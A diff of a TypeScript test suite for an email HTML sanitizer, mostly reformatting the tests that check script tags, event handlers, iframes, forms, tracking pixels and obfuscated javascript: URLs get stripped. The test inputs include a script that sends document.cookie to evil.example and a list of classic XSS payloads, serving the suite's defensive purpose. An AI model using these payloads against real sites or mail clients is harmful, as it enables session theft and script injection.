@@ -24,7 +24,9 @@ function blocked(html: string): number {
 
 describe("execution surfaces", () => {
   it("removes script tags and their contents", () => {
-    const out = clean('<p>hi</p><script>fetch("https://evil.example?c="+document.cookie)</script>');
+    const out = clean(
+      '<p>hi</p><script>fetch("https://evil.example?c="+document.cookie)</script>',
+    );
 
     expect(out).toContain("hi");
     expect(out).not.toMatch(/<script/i);
@@ -33,7 +35,9 @@ describe("execution surfaces", () => {
   });
 
   it("removes event handler attributes", () => {
-    const out = clean('<div onclick="alert(1)" onmouseover="alert(2)" onerror="alert(3)">x</div>');
+    const out = clean(
+      '<div onclick="alert(1)" onmouseover="alert(2)" onerror="alert(3)">x</div>',
+    );
 
     expect(out).not.toMatch(/onclick|onmouseover|onerror/i);
     expect(out).toContain("x");
@@ -47,19 +51,21 @@ describe("execution surfaces", () => {
   });
 
   it.each([
-    ["<iframe src=\"https://evil.example\"></iframe>", /<iframe/i],
-    ["<object data=\"x.swf\"></object>", /<object/i],
-    ["<embed src=\"x.swf\">", /<embed/i],
-    ["<form action=\"https://evil.example\"><input name=\"p\"></form>", /<form|<input/i],
-    ["<base href=\"https://evil.example/\">", /<base/i],
-    ["<link rel=\"stylesheet\" href=\"https://evil.example/x.css\">", /<link/i],
-    ["<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">", /<meta/i],
+    ['<iframe src="https://evil.example"></iframe>', /<iframe/i],
+    ['<object data="x.swf"></object>', /<object/i],
+    ['<embed src="x.swf">', /<embed/i],
+    ['<form action="https://evil.example"><input name="p"></form>', /<form|<input/i],
+    ['<base href="https://evil.example/">', /<base/i],
+    ['<link rel="stylesheet" href="https://evil.example/x.css">', /<link/i],
+    ['<meta http-equiv="refresh" content="0;url=https://evil.example">', /<meta/i],
   ])("removes %s", (input, forbidden) => {
     expect(clean(input)).not.toMatch(forbidden);
   });
 
   it("removes svg, a favourite script vector", () => {
-    const out = clean('<svg><script>alert(1)</script><animate onbegin="alert(2)"/></svg>');
+    const out = clean(
+      '<svg><script>alert(1)</script><animate onbegin="alert(2)"/></svg>',
+    );
 
     expect(out).not.toMatch(/<svg|<script|onbegin/i);
   });
@@ -67,7 +73,9 @@ describe("execution surfaces", () => {
   it("strips a style block instead of printing its CSS as text", () => {
     // The tag must go, and its contents must not reappear as body text — which is
     // what a naive allowlist plus KEEP_CONTENT does.
-    const out = clean("<style>body{background:url(https://evil.example/p.gif)}</style><p>hi</p>");
+    const out = clean(
+      "<style>body{background:url(https://evil.example/p.gif)}</style><p>hi</p>",
+    );
 
     expect(out).not.toMatch(/<style/i);
     expect(out).not.toContain("evil.example");
@@ -83,11 +91,11 @@ describe("execution surfaces", () => {
 
   it("survives the classic parser-confusion payloads", () => {
     for (const payload of [
-      '<img src=x onerror=alert(1)>',
+      "<img src=x onerror=alert(1)>",
       '<a href="jAvAsCrIpT:alert(1)">x</a>',
       '<a href="java&#115;cript:alert(1)">x</a>',
       '<div style="background:url(javascript:alert(1))">x</div>',
-      '<<SCRIPT>alert(1);//<</SCRIPT>',
+      "<<SCRIPT>alert(1);//<</SCRIPT>",
       '<img src="1" onerror="alert(1)" />',
     ]) {
       const out = clean(payload);
@@ -105,7 +113,9 @@ describe("remote content, the tracking-pixel problem", () => {
     expect(result?.blockedRemoteImages).toBe(1);
     // Not loadable, but not lost: click-to-load needs the URL.
     expect(result?.html).not.toMatch(/\ssrc=/);
-    expect(result?.html).toContain('data-blocked-src="https://track.example/pixel.gif?uid=abc"');
+    expect(result?.html).toContain(
+      'data-blocked-src="https://track.example/pixel.gif?uid=abc"',
+    );
   });
 
   it("defuses protocol-relative sources", () => {
@@ -191,7 +201,9 @@ describe("links", () => {
   });
 
   it("keeps mailto and tel", () => {
-    expect(clean('<a href="mailto:a@b.example">mail</a>')).toContain("mailto:a@b.example");
+    expect(clean('<a href="mailto:a@b.example">mail</a>')).toContain(
+      "mailto:a@b.example",
+    );
     expect(clean('<a href="tel:+21612345678">call</a>')).toContain("tel:+216");
   });
 });
@@ -234,9 +246,13 @@ describe("edge cases", () => {
      * on every later sanitize in the process, so the count from one message could
      * bleed into another's.
      */
-    expect(sanitizeEmailHtml('<img src="https://a.example/1.png">')?.blockedRemoteImages).toBe(1);
+    expect(
+      sanitizeEmailHtml('<img src="https://a.example/1.png">')?.blockedRemoteImages,
+    ).toBe(1);
     expect(sanitizeEmailHtml("<p>no images here</p>")?.blockedRemoteImages).toBe(0);
-    expect(sanitizeEmailHtml('<img src="https://b.example/2.png">')?.blockedRemoteImages).toBe(1);
+    expect(
+      sanitizeEmailHtml('<img src="https://b.example/2.png">')?.blockedRemoteImages,
+    ).toBe(1);
   });
 
   it("strips a sender-supplied data-blocked-src", () => {
@@ -245,7 +261,9 @@ describe("edge cases", () => {
      * sender who plants one would otherwise be handing click-to-load a URL of
      * their choosing — and inflating the "N images blocked" count with it.
      */
-    const result = sanitizeEmailHtml('<img data-blocked-src="https://evil.example/p.gif">');
+    const result = sanitizeEmailHtml(
+      '<img data-blocked-src="https://evil.example/p.gif">',
+    );
 
     expect(result?.html).not.toContain("evil.example");
     expect(result?.blockedRemoteImages).toBe(0);
